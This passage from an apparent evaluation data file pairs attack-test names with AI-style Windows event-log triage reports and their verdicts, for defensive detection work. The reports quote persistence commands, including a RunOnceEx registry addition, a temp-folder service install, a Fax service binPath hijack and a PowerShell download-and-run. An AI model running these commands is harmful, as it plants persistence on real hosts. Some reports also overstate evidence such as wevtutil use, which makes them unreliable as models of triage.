  - Educate users on the risks of scripting and encourage updating PowerShell execution policies to restrict unauthorized script execution.
- Continuously monitor for recurrence or new indicators of malicious activity on the network to ensure entire network hygiene."
Reg Key RunOnce,"Upon reviewing the provided Windows event logs, here is a breakdown of the events observed and an assessment of their potential maliciousness:

### Security Log:
1. **Event ID 4616** indicates a change in system time:
   - **Analysis**: These events log a change in the system time, which could be benign, but altering system time can also be used maliciously to disrupt logging and evade detection. The change is minor but should be noted.
   - **Process Involved**: `svchost.exe` with `LOCAL SERVICE` credentials.

### Sysmon Log:
1. **Process Creation Events**:
   - **whoami.exe** and **hostname.exe** are executed by `admin_test` with a high integrity level.
   - **conhost.exe** appears multiple times as a child of both **whoami.exe** and command-line utilities like **cmd.exe** and **wevtutil.exe**. This is typical behavior for console applications.
   - Execution of `cmd.exe` with a registry modification command:
     - **Command**: `cmd.exe` /c REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\Path\file.dll""`
     - **Analysis**: Modifying RunOnceEx registry entries to establish persistence is a common tactic used by malware to execute code upon system startup. This activity is particularly concerning and warrants further investigation.
2. **Microsoft Edge Update Events**:
   - Multiple instances and updates related to **Microsoft Edge Update** are logged.
   - **Analysis**: While most of these activities appear to be legitimate updates of Microsoft Edge software, scrutiny should be given to their frequency and execution paths, especially any occurring from temporary directories. 

### Application Log:
1. **EdgeUpdate Service**: Logs regarding EdgeUpdate showing service stopped.
   - **Analysis**: Normal edge update activities unless there is a suspicious pattern in correlation with other logs.

### System Log:
1. **System Time Changes**:
   - Similar observations as in the security log regarding minor adjustments in system time.

### Conclusion:
There is an indicator of potentially malicious activity, specifically concerning the registry modification by `cmd.exe` designed to ensure persistence through the RunOnceEx key. This activity is not typically benign and can be a sign of malware. The frequent process creation and updates related to Microsoft Edge Update seem mostly legitimate, though irregularities in execution paths should be monitored.

### Resolution:
**SUSPICIOUS** - The activity related to the registry change suggests potential malicious intent that needs further investigation. I recommend conducting a deeper investigation into:
- The origin and purpose of the registry modifications.
- Any unusual patterns or execution paths of the Microsoft Edge update processes.
- Review other systems for similar patterns to determine if this is an isolated incident or part of a broader issue.

Further examination through advanced tools that inspect memory, process anomalies, and behavioral analysis is suggested."
EXO - Full access mailbox permission granted to a user,"After reviewing the provided Windows event logs, here is a detailed analysis focusing on potential indicators of malicious activity:

### Analysis of PowerShell Activity:
1. **PowerShell Script Execution:** The logs show multiple PowerShell events where a script is executed using the `ConsoleHost` which is associated with a series of PowerShell session starts and stops. The script includes:
   - Importing the `ExchangeOnlineManagement` module.
   - Creating secure credentials using `ConvertTo-SecureString`.
   - Executing `Connect-ExchangeOnline` with these credentials.
   - Modifying mailbox permissions using `Add-MailboxPermission`.
   - Disconnecting from Exchange Online.

   **Suspicion Factor:** 
   - Hardcoded credentials within scripts can be a security risk if not managed properly.
   - The script performs administrative actions like adding mailbox permissions. While this can be legitimate in an administration context, if unexpected, it could indicate unauthorized access or privilege escalation attempts.

### Observation from Sysmon Logs:
1. **Frequent Invocation of Built-in Tools:** 
   - The logs feature multiple instances of programs like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`, and `PowerShell.exe`, all executed by a user account “SERVER002\\admin_test”.
   
   **Suspicion Factor:** 
   - Tools such as `whoami.exe` or `hostname.exe` are often used in script-based attacks or troubleshooting to gather system information.
   - The frequent execution of `wevtutil.exe`, a tool for managing event logs, could imply log suppression or modification attempts.
   
2. **High Integrity Level:** 
   - Processes such as `hostname.exe` and `whoami.exe` are running at a high integrity level. This could be routine if the ""admin_test"" account has high privileges, but could also imply privilege escalation if unexpected.

### Evaluation of User Behavior:
The logs are dominated by activities from the account “SERVER002\\admin_test”. Consistent use of admin-like tasks suggests that either this is regular administrative activity or potential unauthorized use of admin credentials.

### Conclusion:
While there is no explicit step-by-step evidence of malicious activity (such as known malware execution), the presence of potentially risky indicators like hard-coded credentials in PowerShell scripts, frequent administrative activity, and potential misuse of system tools elevate the level of concern.

### Final Assessment: SUSPICIOUS
These logs indicate suspicious activity that warrants further investigation. The following actions are recommended:
- **Verify Intent:** Check with administrators to verify whether the PowerShell script execution and associated tasks by “admin_test” were legitimate maintenance tasks.
- **Credential Audit:** Examine and ensure that credentials are securely stored, and that administrative access is justified and monitored.
- **Increase Logging/Auditing:** Enable more descriptive logging around PowerShell script execution and privilege usage.
- **User Activity Monitoring:** Monitor activities from the account “admin_test” for unusual patterns or misuse.

Further investigation of the network and user access patterns, alongside confirming the legitimacy of the executed commands, should help in confirming or refuting the suspicion of malicious intent."
Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs,"After analyzing the provided Windows event logs, here are the findings:

### Suspicious or Anomalous Behaviors:
1. **Time Change Events:**
   - Multiple logs indicate time synchronization issues. The system time was changed from a future date `2024-10-22 18:41:52` back to `2024-10-22 18:41:26` and further adjusted within seconds. This could indicate potential tampering with log timestamps, which could be a method of covering tracks.

2. **Execution of werfault.exe via PowerShell:**
   - PowerShell command execution is seen with the path `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.012\bin\x64\CreateProcessWithPipe.exe` and the suspicious use of `C:\Windows\System32\werfault.exe`. The latter is the Windows Error Reporting utility, and such execution can be anomalous if not associated with legitimate error reporting.

3. **System Utility Executions:**
   - Execution of `wevtutil.exe` (event log management utility) by `SERVER002\admin_test`. This repeated execution may suggest attempts to export or manage event logs without clear justification.
   
4. **Execution of Commonly Used Tools:**
   - The execution of tools like `wevtutil`, `whoami.exe`, and `hostname.exe` can indicate reconnaissance activities typically associated with attackers trying to gather information about the environment.

### Potential Malicious Activities:
1. The combination of PowerShell invocation with scripts stored in temporary directories, along with unusual commands such as launching `werfault.exe`, potentially reflects malicious behavior such as attempts to execute unauthorized scripts or binaries.
2. The frequent execution of `wevtutil.exe` under the same user context (`SERVER002\admin_test`) in quick succession raises a flag for potential log exportation or tampering efforts.
3. The environment setup suggests the presence of utilities, possibly for lateral movement or persistence strategies through PowerShell.

### Threats or Risks:
- **Privilege Abuse:** The use of tools like `wevtutil` and scripts from temporary directories with high integrity levels by a user account indicates potential misuse of privileges.
- **Potential Compromise**: The invocation of PowerShell with out-of-place commands could indicate scripting from malicious actors aiming at exploiting or maintaining access.

### Guidance on How to Proceed:
- **Immediate Review of PowerShell Scripts:** Investigate the mentioned script path and its contents in `C:\Users\ADMIN_~1\AppData\Local\Temp`.
- **User Activity Audit:** Analyze the account `SERVER002\admin_test` for any signs of credential compromise or unusual activity.
- **Time Synchronization Verification:** Validate system time changes through reliable sources and review other systems for similar timestamp issues.
- **In-Depth Threat Analysis:** Given the anomalies, a detailed threat hunt throughout the environment for similar suspicious activities would offer beneficial insights.
- **Strengthen Monitoring & Alerts:** Implement stricter monitoring on the usage of command-line tools and PowerShell executions and ensure appropriate alerting is in place.

**Resolution: MALICIOUS**  
The combination of unexpected time changes, atypical use of system tools, PowerShell script execution with uncommon command lines, and log management utilities being executed improperly point towards potentially malicious activities. Immediate remedial action and a thorough internal security incident investigation are recommended."
Service Installation CMD,"### Analysis of Windows Event Logs:

Upon careful analysis of the provided logs, I've identified the following points that stand out due to their potential for indicating malicious activity or compromise:

1. **Sysmon Logs - Process Creation and Command Execution**:
   - **EventID 1 and 5:** Multiple instances of `cmd.exe`, `sc.exe`, `powershell.exe`, and other system utility executions by the user `SERVER002\admin_test`. Especially noteworthy is the `cmd.exe` command-line containing `sc.exe` creating a service named `fileTestService_CMD` (`EventID 1` with `cmd.exe` having a command line running: `sc.exe create fileTestService_CMD binPath= ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\fileService.exe"" start=auto type=Own & sc.exe start fileTestService_CMD`).
   - The creation of a custom service pointing to an executable in a temporary directory is highly suspicious as it might indicate persistence being established by malicious software.

2. **System Logs - Service Creation**:
   - **EventID 7045:** The creation of the `fileTestService_CMD` service corresponds to the `sc.exe` command identified in the Sysmon logs. The `ImagePath` indicates an executable from a temporary directory, which is suspicious, as legitimate services rarely execute from such locations.

3. **Potential Indicators of Compromise**:
   - The repeated usage of `wevtutil.exe` and `conhost.exe` executed by `SERVER002\admin_test` in short succession could be an attempt to manipulate event logs, possibly to cover tracks.
   - The activity occurs under the context of the `admin_test` user with a high integrity level, potentially indicative of unauthorized administrative actions.
   
4. **PowerShell and Other Logs**:
   - **PowerShell logs are empty**, which may imply cleaning activities, as PowerShell usage is a common vector for delivering payloads or executing scripts under the radar.

### Assessment:

- **SUSPICIOUS**: The logs contain suspicious activity that warrants further investigation. The creation of a service using a command script that points to an executable in a temporary directory is a significant red flag. Additionally, the frequency and pattern of system utility usage suggest potential malicious behavior.

### Recommendations:

1. **Further Investigation**: 
   - Analyze the binary `fileService.exe` found under `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\` for malicious characteristics.
   - Investigate user logs and access to verify if `SERVER002\admin_test` initiated these actions.
   - Examine the integrity and contents of the temporary directory and its files for anomalies or malicious files.
   - Implement enhanced monitoring on `Server002` for further anomalous behavior.

2. **Post-incident Response**:
   - Consider isolating the host if further malicious activity is confirmed to prevent lateral movement.
   - Review and possibly reset credentials associated with the `admin_test` account.
   - Conduct a thorough investigation of connected network interactions and potential data exfiltration attempts.

Based on the presented indicators and behaviors, further investigation is crucial to determine the intent and mitigate risks adequately."
Process Hollowing using PowerShell,"After a careful examination of the provided Windows event logs, I have identified several elements that indicate potential malicious behavior:

### Analysis:

1. **Privileged Account Activity (Security Log)**
   - Multiple 4672 events indicate that the user account `admin_test` was assigned elevated privileges, such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. These privileges can be misused for malicious purposes, such as accessing and manipulating sensitive system operations or taking ownership of files with administrative privilege.

2. **Process Activity (Sysmon Log)**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` were executed by `admin_test` in quick succession. While these processes can be legitimate, their repeated rapid execution might suggest an automated script or command being run.
   - The use of `whoami.exe` and `hostname.exe` also suggests possible reconnaissance activity, as these are often used to gather information about the current user and system in the context of an attack.

3. **Suspicious PowerShell Activity (Windows PowerShell Log)**
   - An event shows the execution of a PowerShell script `Start-Hollow.ps1`, located in a temporary directory, which uses a technique known as Process Hollowing. This is a common tactic used in malware to inject itself into legitimate processes (in this case, replacing `notepad.exe` with `cmd.exe`). This activity is typically associated with advanced persistence or stealth techniques by attackers to bypass security monitoring tools.

4. **Process Creation**
   - The PowerShell executed appears to be using process-altering techniques and could indicate attempts to execute or hide unauthorized applications via process hollowing, a known malicious activity.

### Assessment:
Given the presence of these indications, especially the combination of suspicious PowerShell activity, use of elevated privileges, and sequence of rapidly executed system utilities:

- **Resolution: MALICIOUS**

### Recommendations:
1. **Immediate Containment and Remediation:**
   - Isolate the affected `Server002` from the network to prevent any potential lateral movement or data exfiltration.
   - Investigate the `admin_test` account for any unauthorized modifications, potential compromise, and ensure that the credentials are changed.

2. **Further Investigation:**
   - Review any additional systems for similar behavior as seen on `Server002`.
   - Examine outbound network traffic for signs of data exfiltration.
   - Conduct a comprehensive malware scan and forensic analysis of `Server002`.

3. **Strengthening Security Posture:**
   - Implement additional PowerShell logging and monitoring to detect similar suspicious activities in the future.
   - Consider using tools or solutions to better monitor and alert on events indicative of privilege escalation and unusual command executions.
   - Provide security awareness training to users to understand the implications of executing scripts and utilizing accounts with elevated privileges.

The patterns and activities observed strongly suggest the need for immediate security interventions to contain and remediate a likely security breach."
Remote Process Injection with Go using RtlCreateUserThread WinAPI,"### Log Analysis

#### System Logs
1. **Time Manipulation**:
   - Events 3568 and 3571 in the System log indicate a time change where the system time was set backward. Time synchronization is common; however, abrupt changes, especially by svchost.exe, could be indicative of tampering. This warrants further scrutiny as it could be used to hide traces of malicious activity.

#### Windows PowerShell Logs
2. **Suspicious Script Execution**:
   - Multiple PowerShell events (1043 to 1050) show an unusual use of werfault.exe and a file from a temporary directory: `RtlCreateUserThread.exe`. This can be highly indicative of process injection or exploitation activity: 
     - `werfault.exe` is typically associated with error reporting and is not commonly used in PSA scripts.
     - `RtlCreateUserThread.exe` suggests attempts to create threads within processes, possibly indicative of injection or evasion tactics.

#### Application, Sysmon, and Security Logs
3. **Process Activity**:
   - Sysmon logs show both `whoami.exe` and `conhost.exe` being frequently executed by user `admin_test`, showcasing attempts to gather user information and potential command line utilization (ProcessIDs: 5256, 1628, and 5548). While `whoami.exe` usage isn't inherently malicious, frequent invocation combined with other suspicious activities can be noteworthy.
   - The process `wsmprovhost.exe` is reported as a parent process several times, which is non-standard for most environments unless specific remote management tasks are being executed.

4. **Privilege Escalation**:
   - Security EventID 4672 indicates that the `admin_test` account exercised multiple high-level privileges including Debug and Backup/Restore privileges. The account's action set must be reviewed to ensure it aligns with routine operational activity, especially if NTLM authentication was utilized from a remote workstation (`DESKTOP-3HL5B2P`).

### Assessment and Conclusion

Based on the analysis of provided logs:
- There is a combination of multiple indicators of potentially malicious activity, most notably the unusual PowerShell use, process injection suspicions, frequent `whoami.exe` executions, and svchost.exe manipulating system time.
  
### Recommended Resolution
- **SUSPICIOUS**: The activities in these logs, specifically the use of PowerShell to execute non-standard operations, privilege escalation actions, and time manipulation, are suspicious and warrant further investigation. It's recommended to:
  - Isolate the affected system to prevent potential spread.
  - Conduct a thorough forensic analysis focusing on the `powershell.exe` sessions and inspect temporary files.
  - Verify the legitimacy and necessity of privileges used by the `admin_test` account.
  - Review network traffic and cross-check user activity logs to correlate actions.

Advancing these steps will help confirm any unauthorized activities and allow for an appropriate incident response strategy."
Portable Executable Injection,"Upon reviewing the logs provided, several indicators suggest potentially malicious activity on the host ""Server002"". Let's analyze each relevant aspect of the logs:

1. **Security Log Events**:
   - **Event ID 4624 and 4634**: These logons and logoffs appear normal, with the user ""admin_test"" logging on using NTLM from ""DESKTOP-3HL5B2P"". However, logon type 3 indicates a network logon, which can be common but is worth checking in the context of admin accounts.
   - **Event ID 4672**: This event indicates that the ""admin_test"" account has been granted a series of privileges, including ""SeDebugPrivilege"", ""SeTakeOwnershipPrivilege"", and ""SeLoadDriverPrivilege"", among others. The breadth of these privileges could be concerning if unexpected, suggesting potential credential misuse or malicious privilege escalation.

2. **Windows PowerShell Log**:
   - The execution of a PowerShell script launching an executable named ""RedInjection.exe"" from a temporary directory (C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\bin\\) stands out as highly suspicious. The use of PowerShell to execute code from a temporary path is a common tactic used by malware to avoid detection.

3. **Sysmon Log**:
   - Multiple events record the execution of ""RedInjection.exe"", which is an unfamiliar executable without known publisher or description, matching the characteristics of potentially malicious software.
   - Additionally, PowerShell execution is coupled with commands that are suspicious in nature, such as starting a process that seems unrelated (Notepad) and immediately terminating it using `Stop-Process -Force`. This behavior can often tie into automated tasks to conceal malicious operations or maintain control over a system.
   - The presence of high-integrity processes and the launch of console host processes (conhost.exe) associated with different utilities such as PowerShell and RedInjection.exe, further raises concerns.

4. **Guidance and Resolution**:
   - The logs display clear signs of potentially malicious activity, specifically around the use of PowerShell and the execution of the ""RedInjection.exe"" file.
   - It appears the ""admin_test"" user account might have been compromised or is being abused for actions outside the expected activity norms.
   - Immediate steps should include further investigation into the origin of the ""RedInjection.exe"" executable, its purpose, and source. Additionally, a review of access permissions, privileged account activity, and any associated network traffic from the logon source (e.g., DESKTOP-3HL5B2P) would be prudent.

Given these observations and the evidence pointing to unauthorized software running with elevated privileges, I would classify the findings as:

- **MALICIOUS**: The combination of PowerShell executing an unfamiliar potentially harmful executable, coupled with the high-level privileges observed, indicates a high likelihood of malicious intent requiring immediate remediation steps."
Domain Account and Group Manipulate,"Upon analyzing the provided log entries, the following observations and findings have been made:

**Suspicious Activity:**

1. **PowerShell Execution with Suspicious Script**: 
   - A PowerShell script was executed with command-line sequence invoking Windows PowerShell (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) to create a new Active Directory user and attempt to add this user to the ""Domain Admins"" group. This is indicated in both the Sysmon logs (EventID 1) and Windows PowerShell logs.
   - The script appears to be creating random usernames and adding them to an administrator group, which is a classic sign of malicious activity like an attempted privilege escalation or persistence mechanism by an attacker.

2. **Frequent Use of `conhost.exe`**:
   - Multiple executions of `conhost.exe` (eventually linked to PowerShell and other system tools) were observed. While `conhost.exe` is a legitimate Windows process used to help console windows appear on a Windows desktop, frequent triggering in conjunction with PowerShell activities raises a red flag. It could potentially be leveraged as part of an obfuscation technique.

3. **Wevtutil.exe Executions**:
   - There are several instances where `wevtutil.exe` is invoked. `Wevtutil.exe` is used to retrieve information about event logs and publishers. Excessive log-clearing activities can indicate an attempt to cover up tracks.

4. **Taskhostw.exe Suspicious Activity**:
   - `C:\Windows\System32\taskhostw.exe` is observed in triggering multiple security auditing events (EventID 4798), which are associated with querying for account names or IDs.
   - This might correspond to an attacker trying to query information about accounts available on the system, which can be useful for reconnaissance.

**Conclusion and Resolution:**

Based on the evaluated data, these activities primarily point towards potential malicious intent, especially regarding the PowerShell script involving unauthorized user creation and the addition to administrator groups. Such behavior indicates malicious scripting to gain unauthorized access or control over the system or network resources. There are clear signs of suspicious activity indicating unauthorized privilege escalation attempts.

**Resolution: MALICIOUS**

**Guidance:**

1. **Immediate Response**:
   - Isolate the affected system (Server002) from the network to prevent further potential spread of malicious activity.
   - Conduct a full malware scan and check for latest security updates and patches.

2. **Forensic Analysis**:
   - Capture memory images and disk copies for further forensic analysis.
   - Investigate user account activities, especially the accounts created or modified during the window of suspicious activity.

3. **Review and Harden Security Policies**:
   - Implement strict PowerShell scripting policies. Consider leveraging tools like Device Guard or AppLocker to restrict unauthorized script execution.
   - Monitor and create alerts for unusual user account creations and group modifications in Active Directory.

4. **Review Logs Thoroughly**:
   - Conduct a detailed review of logs for any other concurrent unauthorized activities.
   - Employ correlation and pattern analysis to identify any broader attack patterns.

These steps will help contain and mitigate the threat, as well as provide insights into enhancing the security posture of the organization to prevent future occurrences."
UUID custom process Injection,"Upon detailed examination of the provided logs, there are several indicators of potentially suspicious activity worth noting:

### Findings:
1. **PowerShell Scripts**:
    - There are multiple PowerShell executions of two specific commands:
      - Executing a binary named `uuid_injection.exe` located in a temporary directory followed by a killing of Notepad process (`Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force`).
      - Another PowerShell command involving `Add-Type -AssemblyName PresentationFramework` and showing message boxes followed by starting Notepad.

    - **Uuid_injection.exe**: Executing from a temporary path such as `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\uuid_injection.exe` might imply a presence of possibly unwanted or malicious code being executed. Additionally, the act of forcefully stopping processes and sleeping might be associated with attempts to evade detection or halt running applications that might interfere.

    - **Add-Type Command**: Use of Add-Type in PowerShell to load .NET assemblies and show message boxes may be associated with suspicious activity, as this can, in some contexts, relate to unauthorized alert messages or GUI manipulations.

2. **Sysmon Logs**:
    - The `uuid_injection.exe` execution correlates with the Sysmon event logs; it's observed being executed and related `conhost.exe` processes are also started, indicating visible console output.
    - All suspicious activity is associated with the user `SERVER002\\admin_test`, indicating that this account might have been compromised or might be executing these commands deliberately.

3. **Security Logs**:
    - There are numerous logon events (`ID 4624`) and privilege use logs (`ID 4672`) related to `SYSTEM` and `SERVER002$` which appear normal for standard operations. However, these log events are tagged with special privileges that are commonly leveraged for unauthorized system control.

4. **Security Audits**:
    - `EventID 4798` indicates several user account enumeration occurrences, typically used for reconnaissance or grooming steps in attack vectors.

### Assessment:
Based on the patterns and characteristics of process executions in these logs, the activity aligns more closely with malicious intentions rather than benign or typical administrative tasks. The execution path of `uuid_injection.exe`, along with its potential functionality and suspicious PowerShell commands, raises significant concerns regarding unauthorized or harmful activities being carried out on the host.

### Resolution: MALICIOUS
Given the above analysis, the logs contain activity that is categorically malicious. It is strongly recommended that:

- The host `Server002` be isolated to prevent further potential damage.
- A thorough investigation be conducted to identify how this executable got onto the system.
- The user `admin_test` credentials be reviewed and possibly disabled to avoid further abuse.
- The malicious binary `uuid_injection.exe` and any associated artifacts be scanned and removed from the system.
- Implement enhanced monitoring and possibly reimaging the host to ensure all persistence mechanisms are removed. 

Additionally, it's crucial to conduct a broader evaluation of other systems for similar indicators of compromise and assess for any potential lateral movement from this host."
Azure AD - adding service principal to Azure AD role,"Upon thorough analysis of the provided event logs, several observations can be made regarding potential suspicious or malicious activities.

1. **PowerShell Usage with Suspicious Command-Line**:
    - Multiple `PowerShell.exe` executions are logged, notably one running sophisticated scripts (`Import-Module -Name AzureAD`, `Connect-AzureAD`, etc.) with encoded strings and specific Azure AD commands. This kind of activity indicates a potential for credential access or escalation.
    - Command line obfuscation and use of secure strings to manage credentials (`ConvertTo-SecureString`) suggests an attempt to conduct privileged operations discreetly.

2. **Unusual Parent-Child Process Relationships**:
    - The process `C:\\Windows\\System32\\wsmprovhost.exe` spawning `PowerShell.exe` is usual during remote management tasks but can also indicate malicious intent if not initiated by the system administrator.
    - Use of `wevtutil.exe` indicates manipulation of event logs, potentially to hide traces of activities.

3. **High Integrity Levels for User Processes**:
    - Processes such as `PowerShell.exe`, `HOSTNAME.EXE`, and `whoami.exe` are running with high integrity, executed by `SERVER002\\admin_test`. While `admin_test` may be a legitimate admin account, suspicious command executions need further validation of appropriate administrative consent.

4. **Use of Specific System Utilities**:
    - The presence of `wbem\\WmiPrvSE.exe` and other system command executions like `HOSTNAME.EXE`, and `whoami.exe` could be part of reconnaissance or lateral movement activities.

5. **Regular Windows Update Logs**:
    - The logs exhibit routine Windows Update operations which appear normal and not indicative of over-the-network execution related activities.
  
**Assessment**:
- **PowerShell activities seem targeted towards Azure Active Directory manipulation, suggesting potential credential exploitation or role assignment.**
- **Usage of tools and high-level processes indicate potential misuse of administrative privileges.**
- **Activities surrounding event utilities and console hosts are suspicious and may be used to cover tracks or observe logged events.**

**Resolution**: **SUSPICIOUS**

**Guidance on Proceeding**:
- Conduct a detailed audit of the `admin_test` account to verify if these operations were user-initiated or unauthorized.
- Correlate with additional network and application logs to identify endpoints accessed and data handled during these operations.
- Investigate any alerts or anomalies related to Azure AD services and closely review IAM policies for unauthorized changes.
- Monitor the system for additional suspicious administrative or script-based activity.
- Assess the environment for signs of lateral movement or data exfiltration."
Domain Password Policy Check: Only Two Character Classes,"### Analysis of Windows Event Logs:

#### Suspicious and Anomalous Findings:

1. **PowerShell Script Execution**:
   - Numerous entries in the Windows PowerShell Logs and Sysmon Logs indicate a PowerShell script execution with a command attempting to handle user credentials by reading a credential file and attempting a password change using `Set-ADAccountPassword`. This is typically anomalous behavior unless sanctioned as part of an administrative script for legitimate purposes. The use of scripts to manipulate Active Directory account passwords should be closely audited and monitored to prevent unauthorized account changes.
   - **Example Entry**:
     - `HostApplication=powershell.exe & {$credFile = \""$env:LOCALAPPDATA\\file\\$env:USERNAME.txt\"" ... Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword ...}`

2. **Sysmon Process Creation**:
   - Frequent process creations for `C:\Windows\System32\conhost.exe`, `wevtutil.exe`, and `powershell.exe` by the user `SERVER002\admin_test`. The `wevtutil.exe` is particularly interesting as it is used for managing Windows event logs and may be used to clear logs, thereby hiding malicious activity.

#### Potential Indicators of Compromise:

1. **PowerShell Command Use**:
   - The repeated use of PowerShell with files that potentially contain user credentials and the attempted modification of passwords are significantly suspicious and align with tactics employed in credential theft or privilege escalation.

2. **Sysmon Process IDs Associated with Credential Access**:
   - The Sysmon logs show process creations that align with the PowerShell activities, potentially indicating an automated or scripted process running with elevated privileges to modify credentials.

#### Threats or Risks Identified:

- **Credential Access and Potential Privilege Escalation**:
  - The logs suggest that someone may be attempting or succeeding in accessing credentials and altering account passwords, which poses a direct threat to the security of the system. This could lead to unauthorized access to sensitive data and further compromise the network if not remediated.

#### Guidance on How to Proceed:

1. **Immediate Audit**:
   - Conduct an audit of recent tasks and scripts executed by the account `SERVER002\admin_test`. Confirm whether these changes were authorized and part of normal administrative activities.
   
2. **Review Privileges**:
   - Check and audit the privileges assigned to the `admin_test` account, ensuring that least privilege principles are being followed.
   
3. **Disable Suspect Activities**:
   - If unauthorized activities are confirmed, stop any suspected automated tasks running under `admin_test` and investigate other systems within the network for similar activities.

4. **Credential Reset**:
   - Consider resetting the credentials of affected accounts and communicate with users to be vigilant for anomalous email requests or communications insinuating IT administrator intervention.

5. **Continuous Monitoring**:
   - Increase monitoring on the server `Server002` and the `admin_test` account for any further suspicious activities, utilizing SIEM tools to detect abnormal usage patterns.

### Resolution:

**SUSPICIOUS** - The logs contain indicators that suggest activities warranting further investigation to rule out a potential security breach, with heightened focus on credential handling through PowerShell and associated process executions."
PowerShell Registry RunOnce,"Upon reviewing the provided Windows event logs, we need to pay attention to potential indicators of malicious activity. Let’s break down the logs:

### Security Log Analysis:
1. **Event ID 4624 and 4672:**
   - Logins by the user `admin_test` (SIDs: S-1-5-21-3962163828-2803415714-1403596700-1006) on `Server002` using NTLM over a network connection (Logon Type 3) were noted.
   - These sessions had elevated privileges, including `SeDebugPrivilege` and `SeLoadDriverPrivilege`, which are sensitive rights that could be misused.

### Sysmon Log Analysis:
1. **Events involving `whoami.exe`, `hostname.exe`, and `wevtutil.exe`:**
   - These are typically benign administrative tools, but frequent use or unexpected usage without a clear cause may be suspicious, especially with elevated privileges.
   - Multiple instances of `wevtutil.exe` might suggest event log manipulation or clearance attempts, which is a tactic sometimes used by adversaries.
   
2. **Unusual PowerShell Command:**
   - A PowerShell script was executed with the following command: `powershell.exe & {$RunOnceKey = ""HKLM:\...}`, which involves downloading and executing a script from an external URL (`https://github.com/file/.../Discovery.bat`).
   - This behavior is highly suspicious, as it involves making a network connection to an external source and executing potentially malicious code.

### Windows PowerShell Log Analysis:
1. **PowerShell Startup (Event ID 600) and State Change (Event ID 400, 403):**
   - The PowerShell logs are consistent with the Sysmon logs, showing the session's start and stop, aligned with execution.
   - The command referenced involves setting a registry key for persistence, another red flag.

### Conclusion:
The use of privileged access to execute PowerShell scripts that download content from the internet suggests that these activities could lead to a potential system compromise. This activity, especially the URL fetched by PowerShell, represents a significant risk, possibly indicative of an attempted or successful attack.

### Assessment:
- **Resolution: MALICIOUS**

### Recommended Actions:
1. **Isolate the Host:** Immediately isolate `Server002` from the network to prevent further spread or communication.
2. **Investigate Scope:** Conduct a comprehensive investigation to identify the payload downloaded and executed by the suspicious PowerShell script.
3. **Limit Access:** Review and limit `admin_test` privileges and determine if the account has been compromised.
4. **Conduct Forensic Analysis:** Examine scripts and binaries retrieved from the suspect URL for malicious code.
5. **Rebuild or Restore:** Consider restoring the affected host from a known good backup due to the potential compromise.
6. **Implement Monitoring:** Increase monitoring on critical systems for similar suspicious activities, especially on PowerShell usage and external communications.

By following these steps, you can ensure the containment and remediation of the threat while protecting other assets within the environment."
Modify BootExecute Value,"Based on the analysis of the provided logs, here is a breakdown of observations and findings:

### Windows PowerShell Logs:
- The PowerShell logs show the execution of a script that checks for the existence of a file ""SessionManagerBackup.reg"" in a temporary directory and exports the ""Session Manager"" registry settings to this file if it doesn't exist. Afterwards, it modifies the ""BootExecute"" parameter. 
- Manipulation of registry keys, especially related to the boot configuration, can be indicative of malicious intent, such as persistence mechanisms. However, it's noted no additional suspicious commands are present, and it's executed by a user ""admin_test"". The absence of obfuscation or data exfiltration suggests a planned task which may be scheduled by an admin.

### Security Logs:
- The security logs display events related to time adjustment by the ""LOCAL SERVICE"" account with the process ""svchost.exe"". Adjustments in time can be normal system behavior when synchronizing with a time source. There is nothing indicating suspicious activity, as this is typical for time synchronization tasks done by the OS.

### Sysmon Logs:
- There are a series of processes executed under the user ""SERVER002\admin_test"", but notably no indication of privilege escalation or processes indicative of malware (e.g., no unusual binaries, downloader tools, or use of malicious scripts).
- Multiple executions of EdgeUpdate processes are noticed, which correspond to typical application maintenance tasks and updating processes, consistent with normal software updates.

### Application and System Logs:
- Standard logs regarding Edge update and kernel general tasks are noted. These logs do not suggest malicious activity but routine updates and system maintenance processes.
  
### Overall Findings:
- **Suspicious Activity**: The registry modifications in the PowerShell logs stand out as potentially suspicious, as they involve critical system settings which are commonly targeted for persistence by malware. However, there is no presence of other indicators such as process injection, excessive network connections, or the presence of known malware signatures.
  
- **Benign Activity**: The consistent execution of EdgeUpdate and time synchronization suggest regular system maintenance.

### Conclusion:
Given the context and the available data, the situation described by the logs seems to indicate standard administrative tasks with a slight inclination towards being cautious about the PowerShell script. Without additional indicators of compromise or corroborating evidence of malicious intent, classifying the activities observed in the logs as outright **MALICIOUS** would not be accurate. However, due to the sensitive nature of the registry modification:

**Resolution: SUSPICIOUS**

### Guidance:
- **Verify Intent**: Confirm whether the PowerShell script was executed as part of planned administrative activities or by a legitimate software update process. Checking scheduled tasks and any administrative change logs can provide clarity.
- **Review Access**: Determine who the ""admin_test"" user is and assess what permissions they hold and whether their activities align with expected behavior patterns.
- **Proceed with Caution**: Monitor for any new suspicious activity and consider isolating the system if further anomalies appear. Conduct regular scans for emerging threats."
Modify Fax service to run PowerShell,"Upon review of the provided logs from the Sysmon, Application, Security, and System logs for Server002, several observations lead to the following conclusions:

1. **Frequent Execution of Windows Utilities**:
   - The logs show frequent execution of `wevtutil.exe` and `conhost.exe` used by the user `SERVER002\admin_test`. These utilities are typically used for managing and displaying Windows event logs and console windows, respectively. While the frequent and clustered execution of these processes can be unusual, they are system utilities and don't immediately signal malicious activity unless there are suspicious command-line actions, which are not visible in the logs.

2. **CMD and PowerShell Activity**:
   - An instance of `cmd.exe` was executed with a command to modify the configuration of the `Fax` service to use `PowerShell`. The command-line argument used (`""cmd.exe"" /c sc config Fax binPath= ""C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \""write-host 'data.003 Test'\""""` & sc start Fax`) indicates an attempt to change a service's behavior, potentially for persistence or privilege escalation. This behavior is typically associated with malicious intent as it can alter legitimate service paths to execute arbitrary scripts.
